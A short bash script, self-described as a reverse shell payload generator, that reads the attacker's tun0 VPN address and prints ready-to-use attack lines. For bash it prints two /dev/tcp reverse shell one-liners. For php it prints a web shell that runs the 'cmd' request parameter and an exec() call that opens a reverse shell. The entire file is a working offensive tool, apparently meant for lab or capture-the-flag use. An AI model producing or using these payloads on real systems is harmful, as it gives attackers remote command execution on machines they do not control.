#!/bin/bash

RED="\e[31m"
BLUE="\e[34m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

if [[ "$#" -eq 0 ]]; then
    echo -e "\n${RED}[x]${ENDCOLOR} Option not provided"
    echo -e "\nUsage: shitty_revshell_payload_generator [OPTION]"
fi

IP=$(ip a | grep "tun0" | xargs | cut -d ' ' -f 15 | cut -d '/' -f 1)

if [[ "$1" == "bash" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: shitty_revshell_payload_generator bash <LISTENING_PORT>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Bash reverse shell payloads generated:\n"
        echo -e "\t${YELLOW}1:${ENDCOLOR} bash -i >& /dev/tcp/$IP/$2 0>&1"
        echo -e "\t${YELLOW}2:${ENDCOLOR} bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'"
    fi

elif [[ "$1" == "php" ]]; then
    if [[ "$#" -ne 2 ]]; then
        echo -e "\n${RED}[x]${ENDCOLOR} IP address or port not provided"
        echo -e "\nUsage: shitty_revshell_payload_generator php <LISTENING_PORT>"
    else
        echo -e "\n${BLUE}[+]${ENDCOLOR} Php web shell payloads generated:\n"
        echo -e "\t${YELLOW}1:${ENDCOLOR} <?php if(isset(\$_REQUEST['cmd'])){ system(\$_REQUEST['cmd'] . ' 2>&1'); die; }?>"
        echo -e "\t${YELLOW}1:${ENDCOLOR} <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'\");"
    fi
else
    echo -e "\n${RED}[x]${ENDCOLOR} Invalid option"
    echo -e "\nUsage: shitty_revshell_payload_generator [OPTION]"
    echo -e "\tValid options: bash, php"
fi
